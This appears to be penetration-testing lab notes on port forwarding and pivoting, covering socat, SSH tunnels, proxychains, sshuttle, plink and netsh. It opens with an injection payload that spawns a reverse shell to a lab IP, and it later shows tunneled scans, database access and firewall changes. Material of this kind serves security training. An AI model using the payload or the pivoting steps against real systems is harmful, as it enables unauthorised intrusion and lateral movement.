@@ -1,0 +1,98 @@
+---Port Forwarding with Linux Tools---
++++A Simple Port Forwarding Scenario
+
++++Setting Up the Lab Environment
+Shell
+-> /${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
+
++++Port Forwarding with Socat
+We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.
+
+On CONFLUENCE01, we'll start a verbose (-ddd) Socat process. It will listen on TCP port 2345 (TCP-LISTEN:2345), fork into a new subprocess when it receives a connection (fork) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (TCP:10.4.50.215:5432).
+Confluence$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
+-> Diagram
+***Kali -> Confluence01 (listen port 2345) -> forward tp PGDATABASE01 (5432)
+
+Confluence$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+
+---SSH Tunneling---
++++SSH Local Port Forwarding
+Let's create the SSH connection from CONFLUENCE01 to PGDATABASE01 using ssh, logging in as database_admin. We'll pass the local port forwarding argument we just put together to -L, and use -N to prevent a shell from being opened.
+Confluence$ ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215
+-> Diagram
+In this case, we will instruct SSH to listen on all interfaces on port 4455 on CONFLUENCE01 (0.0.0.0:4455), then forward all packets (through the SSH tunnel to PGDATABASE01) to port 445 on the newly found host (172.16.50.217:445)
+***Kali -> Confluence01 (listen 4455) -> forward to port 445 of 172.16.50.217, data from port 445 will get from database_admin
+
+Check open port: $ ss -ntplu
+
++++SSH Dynamic Port Forwarding
+We will create our SSH connection to PGDATABASE01 using the database_admin credentials again. In OpenSSH, a dynamic port forward is created with the -D option. The only argument this takes is the IP address and port we want to bind to. In this case, we want it to listen on all interfaces on port 9999. We don't have to specify a socket address to forward to. We'll also pass the -N flag to prevent a shell from being spawned.
+Confluence$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+Kali$ tail /etc/proxychains4.conf
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 192.168.50.63 9999
+
++++SSH Remote Port Forwarding
+Kali$ sudo systemctl start ssh
+Kali$ sudo ss -ntplu
+Confluence$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
+->Diagram
+***Kali(2345) <- Confluence01 -> 10.4.50.215 (5432)
+
+Kali$ psql -h 127.0.0.1 -p 2345 -U postgres
+
++++SSH Remote Dynamic Port Forwarding
+Confluence$ ssh -N -R 9998 kali@192.168.118.4
+Kali$ tail /etc/proxychains4.conf
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 9998
+
+Kali$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64
+
++++Using sshuttle
+Confluence$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
+Kali$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24
+
+---Port Forwarding with Windows Tools---
++++ssh.exe
+Window$ ssh -N -R 9998 kali@192.168.118.4
+Kali$ ss -ntplu
+Kali$ tail /etc/proxychains4.conf             
+#       proxy types: http, socks4, socks5, raw
+#         * raw: The traffic is simply forwarded to the proxy without modification.
+#        ( auth types supported: "basic"-http  "user/pass"-socks )
+#
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 127.0.0.1 9998
+
+Kali$ proxychains psql -h 10.4.50.215 -U postgres
+
++++Plink
+Window$ C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 192.168.118.4
+Kali$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+
++++Netsh
+Window$ netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215
+Window$ netstat -anp TCP | find "2222"
+Window$ netsh interface portproxy show all
+Kali$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222
+
+We'll allow connections on the local port (localport=2222) on the interface with the local IP address (localip=192.168.50.64) using the TCP protocol, specifically for incoming traffic (dir=in).
+Window$ netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow
